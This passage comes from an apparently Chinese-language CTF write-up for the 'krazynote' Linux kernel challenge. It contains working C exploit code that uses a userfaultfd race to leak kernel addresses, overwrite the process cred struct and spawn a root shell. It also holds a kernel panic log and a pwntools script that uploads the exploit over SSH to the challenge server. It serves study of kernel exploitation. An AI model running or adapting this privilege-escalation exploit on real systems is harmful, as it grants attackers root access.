        return NULL;
    }
    void register_userfault()
    {
        struct uffdio_api ua;
        struct uffdio_register ur;
        pthread_t thr;
        uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
        ua.api = UFFD_API;
        ua.features = 0;
        if (ioctl(uffd, UFFDIO_API, &ua) == -1) // create the user fault fd
            errExit("[-] ioctl-UFFDIO_API");
        if (mmap(FAULT_PAGE, 0x1000, 7, 0x22, -1, 0) != FAULT_PAGE)//create page used for user fault
            errExit("[-] mmap fault page");
        ur.range.start = (unsigned long)FAULT_PAGE;
        ur.range.len   = 0x1000;
        ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
        if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
            errExit("[-] ioctl-UFFDIO_REGISTER"); //注册页地址与错误处理fd，这样只要copy_from_user
                                          //访问到FAULT_PAGE，则访问被挂起，uffd会接收到信号
        int s = pthread_create(&thr, NULL, handler, (void*)uffd);
        if (s!=0)
            errExit("[-] pthread_create"); // handler函数进行访存错误处理
    }
    int main(int argc, char const *argv[])
    {
        init();
        create(buffer, 0x10);  // memory layout: note struct + 0x10 buffer
        register_userfault();  // register the user fault
        edit(0, FAULT_PAGE, 1);
               /* 漏洞在于edit没有实现锁，所以执行到copy_from_user时访存错误被挂起，
               notes被其他线程篡改，copy_from_user继续运行时导致OOB 和 R&W */
        // 1.leak key
        show(1, buffer);
        unsigned long key = *(unsigned long *)buffer; 
        create(buffer, 0);   // note2: can be overwritten
        // 2. leak module base
        show(1,buffer);      
        unsigned long bss_addr = *(unsigned long*) (buffer + 0x10) ^ key;
        unsigned long module_base = bss_addr - 0x2568;
        printf("[+] key=0x%lx     module_base=0x%lx\n", key, module_base);
        // 3. leak base addr, not kernel_base
        unsigned long page_offset_base = module_base + 0x1fa;
        unsigned long* fake_note = (unsigned long*)buffer;
        fake_note[0] = 0 ^ key;  // note2的key变成0
        fake_note[1] = 4 ^ key;
        fake_note[2] = page_offset_base ^ key;
        edit(1, buffer, 0x18);
        int page_offset_base_offset;
        show(2, (char*)&page_offset_base_offset);
        printf("[+] page_offset_base_offset = 0x%x\n", page_offset_base_offset);
               //0x1f7处是指令 .text:00000000000001F7                 mov     r12, cs:page_offset_base
               //             .text:00000000000001FE                 add     r12, [rax+10h]
        // 计算存基址的地址，并读出该地址
        page_offset_base = module_base + 0x1fe + page_offset_base_offset;
        printf("[+] page_offset_base = 0x%lx\n", page_offset_base);
        fake_note[1] = 8 ^ key;
        fake_note[2] = page_offset_base ^ key;
        edit(1, buffer, 0x18);
        unsigned long base_addr;
        show(2, (char *)&base_addr);
        printf("[+] base_addr = 0x%lx\n", base_addr);
        // 4. search cred   注意：都是相对base_addr找的，所以从偏移0开始找
        if (prctl(PR_SET_NAME, "try2findmesauce")  0xffff000000000000 && task[-2] > 0xffff000000000000)  // 确保cred地址在内核空间
                    break;
            }
        }
        // 5. change cred to 0
        fake_note[0] = 0 ^ key;
        fake_note[1] = 0x28 ^ key;
        fake_note[2] = (task[-2] + 4 - base_addr) ^ key;  // 注意一定是修改相对base_addr的地址
        edit(1, buffer, 0x18);
        int fake_cred[8];
        memset(fake_cred, 0, sizeof(fake_cred));
        edit(2, (char*)fake_cred, 0x28);
        char* args[2] = {"/bin/sh", NULL};
        execv("/bin/sh", args);
        return 0;
    }
想利用`call_usermodehelper`方法来写，但发现prctl_hook怎么都修改不了（可能是系统不允许修改prctl_hook）。报错信息如下：
不过可以改modprobe_path，利用脚本见`exp_modprobe.c`。
    /home/note # ./test
    [+] init done!
    [+] Handler created
    [+] Trigger! I'm going to hang
    [+] done 1
    [+] key=0xffff9a3f0ea52000     module_base=0x65c0c00f0000
    [+] page_offset_base_offset = 0xe5babaa2
    [+] page_offset_base = 0x65c0a5c9bca0
    [+] base_addr = 0xffff9a3f00000000
    [+] real module_base = 0xffffffffc00f0000
    [+] kernel_base = 0xffffffffa4e00000
    [+] order_cmd_addr = 0xffffffffa5e5d940
    [+] prctl_hook_addr = 0xffffffffa5cb0460
    [+] poweroff_work_func_addr = 0xffffffffa4ead300
    [*] Wait 1!
    1
    [*] Wait 2!2
    [   16.235460] BUG: unable to handle kernel paging request at ffffffffa5cb0460
    [   16.238245] #PF error: [PROT] [WRITE]
    [   16.239130] PGD 9c12067 P4D 9c12067 PUD 9c13063 PMD eb8a163 PTE 8000000009ab0061
    [   16.240921] Oops: 0003 [#1] SMP PTI
    [   16.241536] CPU: 0 PID: 169 Comm: test Tainted: G           OE     5.1.9 #1
    [   16.242241] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
    [   16.243084] RIP: 0010:0xffffffffc00f034f
    [   16.243980] Code: de e8 65 7d 31 e5 48 2b 2d 6e b9 ba e5 31 c0 49 89 6c 24 10 e9 eb fd ff ff 48 8b 44 24 18 49 8d 7c 24 08 48 89 de 48 83 e7 f8  89 04 24 89 e8 48 8b 54 03 f8 49 89 54 04 f8 49 29 fc 31 c0 4c
    [   16.246040] RSP: 0018:ffffb4a9c0233d40 EFLAGS: 00000282
    [   16.246269] RAX: ffffffffa4ead300 RBX: ffffb4a9c0233d58 RCX: ffffffffc00f2550
    [   16.246690] RDX: ffffffffc00f0000 RSI: ffffb4a9c0233d58 RDI: ffffffffa5cb0468
    [   16.247939] RBP: 0000000000000020 R08: ffffffffc00f0000 R09: 0000000000000000
    [   16.248679] R10: 0000000000000000 R11: 0000000000000000 R12: ffffffffa5cb0460
    [   16.249253] R13: 00007fff98029c40 R14: 00007fff98029be0 R15: 0000000000000000
    [   16.250133] FS:  0000000001524880(0000) GS:ffff9a3f0f400000(0000) knlGS:0000000000000000
    [   16.251110] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
    [   16.251654] CR2: ffffffffa5cb0460 CR3: 000000000ea52000 CR4: 00000000003006f0
    [   16.252143] Call Trace:
    [   16.253153]  ? __ia32_sys_reboot+0x20/0x20
    [   16.254058]  ? 0xffffffffc00f0000
    [   16.254712]  do_vfs_ioctl+0xa1/0x620
    [   16.255031]  ? vfs_read+0xfb/0x110
    [   16.255355]  ksys_ioctl+0x66/0x70
    [   16.255582]  __x64_sys_ioctl+0x16/0x20
    [   16.255829]  do_syscall_64+0x55/0x110
    [   16.256102]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
    [   16.256469] RIP: 0033:0x4468b7
    [   16.256807] Code: 48 83 c4 08 48 89 d8 5b 5d c3 66 0f 1f 84 00 00 00 00 00 48 89 e8 48 f7 d8 48 39 c3 0f 92 c0 eb 92 66 90 b8 10 00 00 00 0f 05  3d 01 f0 ff ff 0f 83 5d 06 fc ff c3 66 2e 0f 1f 84 00 00 00 00
    [   16.257880] RSP: 002b:00007fff98029bc8 EFLAGS: 00000246 ORIG_RAX: 0000000000000010
    [   16.258288] RAX: ffffffffffffffda RBX: 00000000004002e0 RCX: 00000000004468b7
    [   16.258653] RDX: 00007fff98029be0 RSI: ffffffffffffff01 RDI: 0000000000000003
    [   16.259016] RBP: 00007fff98029c00 R08: 0000000000000000 R09: 0000000000000000
    [   16.259694] R10: 0000000000000000 R11: 0000000000000246 R12: 00000000004073a0
    [   16.259853] R13: 0000000000407430 R14: 0000000000000000 R15: 0000000000000000
    [   16.260087] Modules linked in: note(OE)
    [   16.263528] CR2: ffffffffa5cb0460
    [   16.266388] ---[ end trace 5ced815cb65d3b46 ]---    [   16.269277] RIP: 0010:0xffffffffc00f034f
    [   16.270061] Code: de e8 65 7d 31 e5 48 2b 2d 6e b9 ba e5 31 c0 49 89 6c 24 10 e9 eb fd ff ff 48 8b 44 24 18 49 8d 7c 24 08 48 89 de 48 83 e7 f8  89 04 24 89 e8 48 8b 54 03 f8 49 89 54 04 f8 49 29 fc 31 c0 4c
    [   16.271021] RSP: 0018:ffffb4a9c0233d40 EFLAGS: 00000282
    [   16.271331] RAX: ffffffffa4ead300 RBX: ffffb4a9c0233d58 RCX: ffffffffc00f2550
    [   16.271704] RDX: ffffffffc00f0000 RSI: ffffb4a9c0233d58 RDI: ffffffffa5cb0468
    [   16.272078] RBP: 0000000000000020 R08: ffffffffc00f0000 R09: 0000000000000000
    [   16.272486] R10: 0000000000000000 R11: 0000000000000000 R12: ffffffffa5cb0460
    [   16.272858] R13: 00007fff98029c40 R14: 00007fff98029be0 R15: 0000000000000000
    [   16.273394] FS:  0000000001524880(0000) GS:ffff9a3f0f400000(0000) knlGS:0000000000000000
    [   16.273865] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
    [   16.274193] CR2: ffffffffa5cb0460 CR3: 000000000ea52000 CR4: 00000000003006f0
    [   16.274679] Kernel panic - not syncing: Fatal exception
    [   16.275555] Kernel Offset: 0x23e00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
    [   16.276853] Rebooting in 1 seconds..
## 问题
#### 1.打包错误
    #重新打包后会报错，可能是/bin/busybox 给的权限不对，chmod 777再打包就可以了
    mount: you must be root 
    mount: you must be root
    mount: you must be root 
    /etc/init.d/rcS: line 8: can't create /proc/sys/kernel/dmesg_restrict: nonexistent directory 
    /etc/init.d/rcS: line 9: can't create /proc/sys/kernel/kptr_restrict: nonexistent directory insmod: 
    can't insert 'note.ko': Operation not permitted
#### 2.文件过大
可以参考[这篇writeup](https://thekidofarcrania.gitlab.io/2019/06/13/0ctf19-finals/)，利用[uclibc](https://www.uclibc.org/)来编译二进制文件，环境配置比较麻烦，可直接下载一个[配置好的系统](https://hub.docker.com/r/klee/uclibc)。
#### 3.上传文件并执行
    #!/usr/bin/env python2
    from pwn import *
    def send_command(cmd, print_cmd = True, print_resp = False):
        if print_cmd:
            log.info(cmd)
        p.sendlineafter("$", cmd)
        resp = p.recvuntil("$")
        if print_resp:
            log.info(resp)
        p.unrecv("$")
        return resp
    def send_file(name):
        file = read(name)
        f = b64e(file)
        send_command("rm /home/note/a.gz.b64")
        send_command("rm /home/note/a.gz")
        send_command("rm /home/note/a")
        size = 800
        for i in range(len(f)/size + 1):
            log.info("Sending chunk {}/{}".format(i, len(f)/size))
            send_command("echo -n '{}'>>/home/note/a.gz.b64".format(f[i*size:(i+1)*size]), False)
        send_command("cat /home/note/a.gz.b64 | base64 -d > /home/note/a.gz")
        send_command("gzip -d /home/note/a.gz")
        send_command("chmod +x /home/note/a")
    def exploit():
        send_file("exploit.gz")
        #send_command("/home/note/a")
        p.sendline("/home/note/a")
        p.interactive()
    if __name__ == "__main__":
        #context.log_level = 'debug'
        s = ssh(host="krazynote-3.balsnctf.com", port=54321, user="knote", password="knote", timeout=5)
        p = s.shell('/bin/sh')
        #p = process("./run.sh")
        exploit()
## 参考
[userfaultfd使用方法](https://blog.lizzie.io/using-userfaultfd.html)
[从内核到用户空间(1) — 用户态缺页处理机制 userfaultfd
的使用](http://blog.jcix.top/2018-10-01/userfaultfd_intro/)